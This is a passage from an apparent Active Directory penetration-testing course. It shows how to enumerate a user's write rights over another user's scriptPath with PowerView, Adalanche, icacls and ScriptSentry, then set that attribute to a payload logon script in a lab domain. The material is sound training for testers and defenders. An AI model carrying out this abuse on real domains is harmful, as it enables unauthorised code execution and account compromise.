
---
---
## Enumeration from Windows

We will use `PowerView` and `Adalanche` to enumerate the ACEs that `david` has over `eric` from Windows.
### PowerView

After importing the `PowerView` module, we will save the `SID` of `david` into a variable and then use [Get-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) to get all of `eric`'s ACEs, filtering ones that contain the `SID` of `david` in their `SecurityIdentifier` field:
#### Getting the ACEs of David over Eric

```powershell
PS C:\Users\David\Downloads> Import-Module .\PowerView.ps1
```

```powershell
PS C:\Users\David\Downloads> $DavidSID = (Get-DomainUser -Identity david).objectSID
```

```powershell
PS C:\Users\David\Downloads> Get-DomainObjectAcl -Identity eric -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $DavidSID}
```

In the `ActiveDirectoryRights` field, `PowerView` displays that `david` has `ReadProperty` and `WriteProperty` over the `ObjectAceType` with the value `Script-Path` (which is the attribute's `Common Name`; `scriptPath` is the `LDAP Display Name`); therefore, `david` has `read` and `write` rights on `eric`'s `scriptPath`.

### Adalanche

Installing and running `Adalanche` on Windows is the same as on `Linux`-based systems, given that it compiles to cross-platform binaries that can run on `x86`, `x64`, and `ARM64` architectures. However, using it on Windows can be much simpler because we can run it without supplying any parameters, making it run in "[full auto](https://github.com/lkarlslund/Adalanche?tab=readme-ov-file#easy-mode--full-auto)" mode; in this mode, `Adalanche` attempts to autodetect as many parameters on its own and collects data from the AD environment and then launches its interactive discovery tool automatically.

---
---

## Abusing Write scriptPath from Windows

Exploiting this DACL misconfiguration on Windows is similar to doing so on Linux; however, the only difference lies in Steps 1 and 3: Enumerating the `NETLOGON` share to determine whether `david` has `write` permissions anywhere within it and updating `eric`'s `scriptPath`.

### Step 1

We can use `ls` on the `LOGONSERVER` environment variable followed by `NETLOGON` to list the available folders:

```powershell
PS C:\Users\david> ls $env:LOGONSERVER\NETLOGON


    Directory: \\DC03\NETLOGON


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
<SNIP>
d-----         5/2/2024  12:21 PM                EF0ACCC0DBED
d-----         5/2/2024  12:25 PM                EFD0FF1ABB33
d-----         5/3/2024   6:34 AM                EricsScripts
d-----         5/2/2024  12:23 PM                FECA1DBD30F2
<SNIP>
```

Then, we will use [icacls](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) to enumerate the permissions that `david` has on the "EricsScripts" folder:

```powershell
PS C:\Users\david> icacls $env:LOGONSERVER\NETLOGON\EricsScripts

\\DC03\NETLOGON\EricsScripts INLANEFREIGHT\david:(OI)(CI)(RX,W)
                             NT AUTHORITY\Authenticated Users:(I)(RX)
                             NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(GR,GE)
                             BUILTIN\Server Operators:(I)(RX)
                             BUILTIN\Server Operators:(I)(OI)(CI)(IO)(GR,GE)
                             BUILTIN\Administrators:(I)(F)
                             BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                             NT AUTHORITY\SYSTEM:(I)(F)
                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                             CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

Similar to `smbcacls`, `icacls` displays that `david` has `R` (`Read`), `W` (`Write`), and `X` (`Execute`) permissions on the folder.

Alternatively, we can use [ScriptSentry](https://github.com/techspence/ScriptSentry), described in the blog post [Hidden Menace: How to Identify Misconfigured and Dangerous Logon Scripts](https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/), to automate the discovery of misconfigurations in logon scripts, including:

- `Unsafe UNC Folder Permissions`
- `Unsafe UNC File Permissions`
- `Unsafe Logon Script Permissions`
- `Unsafe GPO Logon Script Permissions`
- `Unsafe NETLOGON/SYSVOL Permissions`
- `Plaintext Credentials`

`ScriptSentry` will enumerate for dangerous/unsafe permissions on logon script files within `NETLOGON`. After running `Invoke-ScriptSentry.ps1` (found within `C:\Tools`), we discover that the user `daniel` has `Read`, `Write`, and `Execute` on the logon script 'logonScript.bat', and that the logon script 'scriptShare.cmd' contains plaintext credentials:
#### Running Invoke-ScriptSentry

```powershell
PS C:\Tools> .\Invoke-ScriptSentry.ps1
```

### Step 3

To modify `eric`'s `scriptPath`, we can use `PowerView`.

#### Set-DomainObject

After importing the [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module, we will use [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/), passing to the `scriptPath` and the location of our payload file:

```powershell
PS C:\Users\David> Import-Module .\PowerView.ps1
PS C:\Users\David> Set-DomainObject eric -Set @{'scriptPath'='EricsScripts\logonScript.bat'}
```

To ensure that `PowerView` updated the attribute accordingly, we will use [Get-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) and pass `scriptPath` for the `-Properties` flag:

```powershell
PS C:\Users\David> Get-DomainObject eric -Properties scriptPath
```

From `PowerView`'s output, we will know it has successfully updated the attribute.

